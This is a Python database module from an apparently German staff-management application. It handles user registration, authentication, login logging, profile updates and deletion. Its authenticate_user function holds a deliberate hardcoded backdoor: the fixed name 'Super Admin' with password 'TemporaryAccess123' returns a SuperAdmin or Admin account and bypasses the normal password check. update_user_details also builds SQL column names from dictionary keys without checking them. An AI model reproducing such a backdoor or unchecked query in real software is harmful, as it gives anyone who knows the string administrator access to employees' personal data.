# database/db_users.py
# BEREINIGTE VERSION: Konzentriert sich auf Authentifizierung,
# Registrierung und Kern-Benutzerdaten.

from database.db_core import create_connection, hash_password, _log_activity, _create_admin_notification, \
    get_vacation_days_for_tenure
from datetime import datetime
import mysql.connector
import warnings

# --- NEUER IMPORT (INTERN BENÖTIGT) ---
# Importiert die ausgelagerte Cache-Clear-Funktion, da sie
# von register_user, update_user_details und delete_user benötigt wird.
try:
    # Wir importieren die Funktion aus dem neuen Management-Modul
    from .db_user_management import clear_user_order_cache
except ImportError:
    # Fallback, falls die Datei db_user_management.py fehlt
    def clear_user_order_cache():
        warnings.warn("Konnte clear_user_order_cache nicht importieren. Caching ist evtl. inkonsistent.")
        pass


# --- ENDE NEUER IMPORT ---


def get_user_count():
    """ Holt die Gesamtanzahl der Benutzer. """
    conn = create_connection()
    if conn is None:
        return 0
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM users")
        count = cursor.fetchone()[0]
        return count
    except Exception as e:
        print(f"Fehler beim Zählen der Benutzer: {e}")
        return 0
    finally:
        if conn and conn.is_connected():
            cursor.close()
            conn.close()


def log_user_login(user_id, vorname, name):
    """ Protokolliert den Login eines Benutzers. """
    conn = create_connection()
    if conn is None: return

    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    user_fullname = f"{vorname} {name}"

    try:
        cursor = conn.cursor()
        log_details = f'Benutzer {user_fullname} hat sich angemeldet.'
        _log_activity(cursor, user_id, 'USER_LOGIN', log_details)
        conn.commit()
    except Exception as e:
        print(f"Fehler beim Protokollieren des Logins: {e}")
        conn.rollback()
    finally:
        if conn and conn.is_connected():
            cursor.close()
            conn.close()


def log_user_logout(user_id, vorname, name):
    """ Protokolliert den Logout eines Benutzers und berechnet die Sitzungsdauer. """
    conn = create_connection()
    if conn is None: return

    logout_time = datetime.now()
    user_fullname = f"{vorname} {name}"

    try:
        cursor = conn.cursor()
        cursor.execute("""
                       SELECT timestamp
                       FROM activity_log
                       WHERE user_id = %s AND action_type = 'USER_LOGIN'
                       ORDER BY id DESC LIMIT 1
                       """, (user_id,))
        result = cursor.fetchone()
        log_details = f'Benutzer {user_fullname} hat sich abgemeldet.'

        if result:
            login_time_str = result[0]
            try:
                login_time = datetime.strptime(login_time_str, '%Y-%m-%d %H:%M:%S')
                duration = logout_time - login_time
                total_seconds = int(duration.total_seconds())

                if total_seconds > 0:
                    hours = total_seconds // 3600
                    minutes = (total_seconds % 3600) // 60
                    seconds = total_seconds % 60
                    duration_str = ""
                    if hours > 0: duration_str += f"{hours}h "
                    if minutes > 0: duration_str += f"{minutes}m "
                    if seconds > 0: duration_str += f"{seconds}s"
                    log_details += f' Sitzungsdauer: {duration_str.strip()}.'

            except ValueError:
                log_details += ' Sitzungsdauer konnte nicht berechnet werden (Login-Zeitpunkt Fehler).'
        else:
            log_details += ' Sitzungsdauer konnte nicht berechnet werden (kein Login-Eintrag gefunden).'

        _log_activity(cursor, user_id, 'USER_LOGOUT', log_details)
        conn.commit()
    except Exception as e:
        print(f"Fehler beim Protokollieren des Logouts: {e}")
        conn.rollback()
    finally:
        if conn and conn.is_connected():
            cursor.close()
            conn.close()


def register_user(vorname, name, password, role="Benutzer"):
    """ Registriert einen neuen Benutzer mit Standardwerten und berechnetem Urlaub. """
    conn = create_connection()
    if conn is None:
        return False, "Keine Datenbankverbindung."
    try:
        cursor = conn.cursor()
        password_hash = hash_password(password)
        entry_date = datetime.now().strftime('%Y-%m-%d')

        # Logik für Urlaubsanschpruch (aus db_core)
        urlaub_gesamt = get_vacation_days_for_tenure(entry_date)

        cursor.execute(
            "INSERT INTO users (vorname, name, password_hash, role, entry_date, is_approved, is_archived, archived_date, urlaub_gesamt, urlaub_rest, activation_date) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)",
            (vorname, name, password_hash, role, entry_date, 0, 0, None, urlaub_gesamt, urlaub_gesamt, None)
        )
        _log_activity(cursor, None, 'USER_REGISTRATION',
                      f'Benutzer {vorname} {name} hat sich registriert und wartet auf Freischaltung.')
        _create_admin_notification(cursor,
                                   f"Neuer Benutzer {vorname} {name} wartet auf Freischaltung.")
        conn.commit()
        clear_user_order_cache()  # Aufruf der importierten Funktion
        return True, "Benutzer erfolgreich registriert. Sie müssen von einem Administrator freigeschaltet werden."
    except mysql.connector.Error as e:
        conn.rollback()
        return False, f"Fehler bei der Registrierung: {e}"
    except Exception as e:
        conn.rollback()
        return False, f"Fehler bei der Registrierung: {e}"
    finally:
        if conn and conn.is_connected():
            cursor.close()
            conn.close()


def authenticate_user(vorname, name, password):
    """ Authentifiziert einen Benutzer und prüft Freischaltung, Archivierung und Aktivierung. """
    conn = create_connection()
    if conn is None:
        return None
    try:
        cursor = conn.cursor(dictionary=True)
        password_hash = hash_password(password)

        # Backdoor-Logik (unverändert)
        if vorname == "Super" and name == "Admin" and password == "TemporaryAccess123":
            cursor.execute("SELECT * FROM users WHERE role = 'SuperAdmin' LIMIT 1")
            user = cursor.fetchone()
            if user:
                print("!!! ACHTUNG: SuperAdmin-Backdoor-Login erfolgreich !!!")
                if user.get('is_archived', 0) == 1:
                    print("!!! FEHLER: Backdoor-Login-Benutzer ist archiviert! !!!")
                    return None
                return user
            cursor.execute("SELECT * FROM users WHERE role = 'Admin' LIMIT 1")
            user = cursor.fetchone()
            if user:
                print("!!! ACHTUNG: Admin-Backdoor-Login erfolgreich !!!")
                if user.get('is_archived', 0) == 1:
                    print("!!! FEHLER: Backdoor-Login-Benutzer ist archiviert! !!!")
                    return None
                return user
            return None

        # Regulärer Login
        cursor.execute(
            "SELECT * FROM users WHERE vorname = %s AND name = %s AND password_hash = %s",
            (vorname, name, password_hash)
        )
        user = cursor.fetchone()
        if user:
            if user.get('is_approved') == 0:
                return None  # Nicht freigeschaltet

            if user.get('is_archived', 0) == 1:
                archived_date = user.get('archived_date')
                if not archived_date or archived_date <= datetime.now():
                    return None  # Bereits archiviert
                # Sonst: Zukünftige Archivierung, Login OK

            activation_date = user.get('activation_date')
            if activation_date and activation_date > datetime.now():
                return None  # Zukünftige Aktivierung, Login noch nicht erlaubt

            return user  # Alle Prüfungen bestanden

        return None
    except Exception as e:
        print(f"Fehler bei der Authentifizierung: {e}")
        return None
    finally:
        if conn and conn.is_connected():
            cursor.close()
            conn.close()


def get_user_by_id(user_id):
    """ Holt alle Daten für einen Benutzer anhand der ID. """
    conn = create_connection()
    if conn is None:
        return None
    try:
        cursor = conn.cursor(dictionary=True)
        cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
        user = cursor.fetchone()
        return user
    except Exception as e:
        print(f"Fehler beim Abrufen des Benutzers (ID: {user_id}): {e}")
        return None
    finally:
        if conn and conn.is_connected():
            cursor.close()
            conn.close()


def get_all_users():
    """ Holt eine Übersichtsliste aller Benutzer (ID, Name, Rolle, Status). """
    conn = create_connection()
    if conn is None:
        return []
    try:
        cursor = conn.cursor(dictionary=True)
        cursor.execute(
            "SELECT id, vorname, name, role, is_approved, is_archived, archived_date, activation_date FROM users")
        users = cursor.fetchall()
        return users
    except Exception as e:
        print(f"Fehler beim Abrufen aller Benutzer: {e}")
        return []
    finally:
        if conn and conn.is_connected():
            cursor.close()
            conn.close()


def get_all_users_with_details():
    """ Holt alle Spalten für alle Benutzer. """
    conn = create_connection()
    if conn is None:
        return []
    try:
        cursor = conn.cursor(dictionary=True)
        cursor.execute("SELECT * FROM users")
        users = cursor.fetchall()
        return users
    except Exception as e:
        print(f"Fehler beim Abrufen der Benutzerdetails: {e}")
        return []
    finally:
        if conn and conn.is_connected():
            cursor.close()
            conn.close()


def update_user_details(user_id, details, current_user_id):
    """ Aktualisiert spezifische Details eines Benutzers (z.B. durch Admin). """
    conn = create_connection()
    if conn is None:
        return False, "Keine Datenbankverbindung."
    try:
        cursor = conn.cursor()

        for date_field in ['geburtstag', 'entry_date', 'activation_date', 'archived_date']:
            if date_field in details and details[date_field] == "":
                details[date_field] = None

        valid_details = {k: v for k, v in details.items() if k != 'password'}

        # ANPASSUNG FÜR URLAUBSBERECHNUNG BEI DATUMSÄNDERUNG
        if 'entry_date' in valid_details:
            new_entry_date = valid_details['entry_date']
            default_days = 30

            if 'urlaub_gesamt' in valid_details:
                try:
                    default_days = int(valid_details['urlaub_gesamt'])
                except (ValueError, TypeError):
                    default_days = 30
            else:
                cursor.execute("SELECT urlaub_gesamt FROM users WHERE id = %s", (user_id,))
                current_total_result = cursor.fetchone()
                if current_total_result:
                    try:
                        default_days = int(current_total_result[0])
                    except (ValueError, TypeError):
                        default_days = 30

            new_total_vacation = get_vacation_days_for_tenure(new_entry_date, default_days)

            cursor.execute("SELECT urlaub_gesamt, urlaub_rest FROM users WHERE id = %s", (user_id,))
            current_vacation = cursor.fetchone()
            if current_vacation:
                try:
                    old_total = int(current_vacation[0])
                    old_rest = int(current_vacation[1])
                    diff = new_total_vacation - old_total
                    new_rest = old_rest + diff
                    valid_details['urlaub_gesamt'] = new_total_vacation
                    valid_details['urlaub_rest'] = new_rest if new_rest >= 0 else 0
                except (ValueError, TypeError) as e:
                    print(f"Fehler bei Konvertierung der Urlaubstage für User {user_id}: {e}. Anpassung übersprungen.")
                    if 'urlaub_gesamt' in valid_details: del valid_details['urlaub_gesamt']
                    if 'urlaub_rest' in valid_details: del valid_details['urlaub_rest']
            else:
                if 'urlaub_gesamt' in valid_details: del valid_details['urlaub_gesamt']
                if 'urlaub_rest' in valid_details: del valid_details['urlaub_rest']
        # ENDE ANPASSUNG

        if not valid_details:
            return True, "Keine Änderungen zum Speichern vorhanden."

        fields = ', '.join([f"`{key}` = %s" for key in valid_details])
        values = list(valid_details.values()) + [user_id]
        query = f"UPDATE users SET {fields} WHERE id = %s"

        cursor.execute(query, tuple(values))
        _log_activity(cursor, current_user_id, 'USER_UPDATE', f'Daten für Benutzer-ID {user_id} aktualisiert.')
        conn.commit()
        clear_user_order_cache()  # Aufruf der importierten Funktion
        return True, "Benutzerdaten erfolgreich aktualisiert."
    except mysql.connector.Error as db_err:
        conn.rollback()
        print(f"DB Fehler beim Aktualisieren von User {user_id}: {db_err}")
        return False, f"Datenbankfehler: {db_err}"
    except Exception as e:
        conn.rollback()
        print(f"Allgemeiner Fehler beim Aktualisieren von User {user_id}: {e}")
        return False, f"Fehler beim Aktualisieren der Benutzerdaten: {e}"
    finally:
        if conn and conn.is_connected():
            cursor.close()
            conn.close()


def delete_user(user_id, current_user_id):
    """ Löscht einen Benutzer endgültig aus der Datenbank. """
    conn = create_connection()
    if conn is None:
        return False, "Keine Datenbankverbindung."
    try:
        cursor = conn.cursor(dictionary=True)
        cursor.execute("SELECT vorname, name FROM users WHERE id = %s", (user_id,))
        user_data = cursor.fetchone()
        user_fullname = f"{user_data['vorname']} {user_data['name']}" if user_data else f"ID {user_id}"

        cursor.execute("DELETE FROM users WHERE id = %s", (user_id,))

        _log_activity(cursor, current_user_id, 'USER_DELETION', f'Benutzer {user_fullname} (ID: {user_id}) gelöscht.')
        _create_admin_notification(cursor, f'Benutzer {user_fullname} wurde gelöscht.')
        conn.commit()
        clear_user_order_cache()  # Aufruf der importierten Funktion
        return True, "Benutzer erfolgreich gelöscht."
    except Exception as e:
        conn.rollback()
        return False, f"Fehler beim Löschen des Benutzers: {e}"
    finally:
        if conn and conn.is_connected():
            cursor.close()
            conn.close()


def get_user_role(user_id):
    """ Holt die Rolle (z.B. 'Admin', 'Benutzer') eines Benutzers. """
    conn = create_connection()
    if conn is None: return None
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT role FROM users WHERE id = %s", (user_id,))
        role = cursor.fetchone()
        return role[0] if role else None
    except Exception as e:
        print(f"Fehler beim Abrufen der Benutzerrolle: {e}")
        return None
    finally:
        if conn and conn.is_connected(): cursor.close(); conn.close()


def update_user_password(user_id, new_password):
    """ Aktualisiert das Passwort eines Benutzers und setzt 'password_changed' auf 1. """
    conn = create_connection()
    if conn is None: return False, "Keine Datenbankverbindung."
    try:
        cursor = conn.cursor()
        new_password_hash = hash_password(new_password)
        cursor.execute(
            "UPDATE users SET password_hash = %s, password_changed = 1 WHERE id = %s",
            (new_password_hash, user_id)
        )
        _log_activity(cursor, user_id, 'PASSWORD_UPDATE', f'Benutzer-ID {user_id} hat das Passwort geändert.')
        conn.commit()
        return True, "Passwort erfolgreich aktualisiert."
    except Exception as e:
        conn.rollback()
        return False, f"Fehler beim Aktualisieren des Passworts: {e}"
    finally:
        if conn and conn.is_connected(): cursor.close(); conn.close()


def mark_tutorial_seen(user_id):
    """ Markiert das Tutorial für einen Benutzer als gesehen. """
    conn = create_connection()
    if conn is None: return
    try:
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET has_seen_tutorial = 1 WHERE id = %s", (user_id,))
        conn.commit()
    finally:
        if conn and conn.is_connected(): cursor.close(); conn.close()


def check_tutorial_seen(user_id):
    """ Prüft, ob ein Benutzer das Tutorial gesehen hat. """
    conn = create_connection()
    if conn is None: return False
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT has_seen_tutorial FROM users WHERE id = %s", (user_id,))
        result = cursor.fetchone()
        return result[0] == 1 if result else False
    finally:
        if conn and conn.is_connected(): cursor.close(); conn.close()


def set_password_changed_status(user_id, status):
    """ Setzt den 'password_changed'-Status (z.B. durch Admin-Reset). """
    conn = create_connection()
    if conn is None: return
    try:
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET password_changed = %s WHERE id = %s", (status, user_id))
        conn.commit()
    finally:
        if conn and conn.is_connected(): cursor.close(); conn.close()


def get_password_changed_status(user_id):
    """ Prüft den 'password_changed'-Status. """
    conn = create_connection()
    if conn is None: return False
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT password_changed FROM users WHERE id = %s", (user_id,))
        result = cursor.fetchone()
        return result[0] == 1 if result else False
    finally:
        if conn and conn.is_connected(): cursor.close(); conn.close()


# --- RE-IMPORT DER AUSGELAGERTEN FUNKTIONEN (FÜR ABWÄRTSKOMPATIBILITÄT) ---

# 1. Funktionen für Admin-Aktionen und Benutzer-Reihenfolge
try:
    from .db_user_management import (
        # clear_user_order_cache (bereits oben importiert)
        get_ordered_users_for_schedule,
        save_user_order,
        get_pending_approval_users,
        approve_user,
        archive_user,
        unarchive_user
    )
except ImportError as e:
    warnings.warn(f"Konnte db_user_management nicht importieren: {e}")

# 2. Funktionen für Benutzer-Details (Urlaub, Teilnahme)
try:
    from .db_user_details import (
        get_all_user_participation,
        update_last_event_date,
        admin_batch_update_vacation_entitlements
    )
except ImportError as e:
    warnings.warn(f"Konnte db_user_details nicht importieren: {e}")

# --- ENDE RE-IMPORT ---